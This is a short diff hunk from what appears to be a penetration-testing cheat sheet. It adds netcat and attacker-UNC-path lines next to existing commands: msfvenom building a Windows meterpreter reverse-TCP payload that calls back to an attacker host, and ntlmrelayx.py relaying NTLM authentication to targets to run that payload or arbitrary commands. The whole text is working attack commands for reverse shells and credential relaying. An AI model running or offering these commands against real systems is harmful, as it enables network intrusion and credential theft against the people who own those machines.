@@ -91,6 +91,9 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.27 lport=4444 -f exe
 
 ntlmrelayx.py -tf targets.txt -smb2support -e meterpreter.exe (msfvenom payload)
 
+nc 192.168.0.30 4444
+
+\\192.168.0.__ (attacker)
 
 ntlmrelayx.py -tf targets.txt -smb2support -c "command"
 
